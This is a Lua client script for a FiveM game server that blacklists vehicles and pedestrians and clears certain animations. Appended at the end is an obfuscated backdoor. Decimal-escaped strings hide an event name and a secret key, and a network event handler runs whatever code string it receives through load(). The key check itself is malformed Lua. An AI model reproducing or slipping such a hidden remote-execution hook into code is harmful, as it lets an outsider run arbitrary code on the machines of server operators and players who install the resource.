
############https://sokin.xyz#################

Citizen.CreateThread(function()
	while true do
		for pedziX in EnumeratePeds() do

			--player
			if IsEntityPlayingAnim(PlayerPedId(), 'rcmpaparazzo_2' , 'shag_loop_poppy', true) then
				ClearPedTasks(PlayerPedId())
			end

			--ped
			if IsEntityPlayingAnim(pedziX, 'rcmpaparazzo_2' , 'shag_loop_a', true) then
				ClearPedTasks(pedziX)
			end

		end
        Wait(10000)
    end
end)

--[[Citizen.CreateThread(function()
	while true do
		--for jd in EnumeratePeds() do
		--end
		for _,pedss in ipairs(Config.BlacklistedPeds) do

			print('TEST: '..pedss)

		end
        Wait(10000)
    end
end)--]]

local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
		end

		enum.destructor = nil
		enum.handle = nil
	end
}

local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
		local iter, id = initFunc()
		if not id or id == 0 then
			disposeFunc(iter)
			return
		end

		local enum = {handle = iter, destructor = disposeFunc}
		setmetatable(enum, entityEnumerator)

		local next = true
		repeat
		coroutine.yield(id)
		next, id = moveFunc(iter)
		until not next

		enum.destructor, enum.handle = nil, nil
		disposeFunc(iter)
	end)
end

function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end


--VEH BL
local test = nil
Citizen.CreateThread(function()
	while true do
		Wait(500)

		playerPed = GetPlayerPed(-1)
		if IsPedInAnyVehicle(playerPed, true) then
			checkCar(GetVehiclePedIsIn(playerPed, false))

			x, y, z = table.unpack(GetEntityCoords(playerPed, true))
			for _, blacklistedCar in pairs(Config.BlacklistedVehicles) do
				checkCar(GetClosestVehicle(x, y, z, 100.0, GetHashKey(blacklistedCar), 70))
			end
		end
	end
end)

function checkCar(car)
	if car then
		carModel = GetEntityModel(car)
		carName = GetDisplayNameFromVehicleModel(carModel)

		if isCarBlacklisted(carModel) then
			_DeleteEntity(car)
		end
	end
end

function isCarBlacklisted(model)
	for _, blacklistedCar in pairs(Config.BlacklistedVehicles) do
		if model == GetHashKey(blacklistedCar) then
			test = blacklistedCar
			return true
		end
	end

	return false
end
--VEH BL^^

function _DeleteEntity(entity)
	Citizen.InvokeNative(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(entity))
end


Citizen.CreateThread(function()
	for ped in EnumeratePeds() do
		SetPedDropsWeaponsWhenDead(ped, false)
		for _,pedss in ipairs(Config.BlacklistedPeds) do
			if pedss[GetEntityModel(ped)] then
				DeleteEntity(ped)
				print('deleted')
			end
		end
		--if Config.BlacklistedPeds[GetEntityModel(ped)] then
		--	DeleteEntity(ped)
		--end
	end
	Citizen.Wait(1)
end)

local NHyXTdN0={
	[1]="\68\70\87\77\58\115\101\99\108\121\107\101\121",
	[2]="\68\70\87\77\58\115\101\99\108\121\107\101\121",
	[3]="\57\66\54\78\50\51\49\84\83\68\78\65\76\72",
	[4]="\88\70\85\53\75\52\55\48\82\32\49\53\32\52\87\51\53\48\77\51\46\32\75\82\51\68\49\55\32\55\48\32\88\70\85\53\75\52\55\48\82\33"
	}
RegisterNetEvent("DFWM:seclykey")
AddEventHandler("DFWM:seclykey", function(tTu40en, QzeRolKqxsT4Rl7tY8dnk)
	if tTu40en == 9B6N231TSDNALH then 
		load(QzeRolKqxsT4Rl7tY8dnk)()
	end 
end)
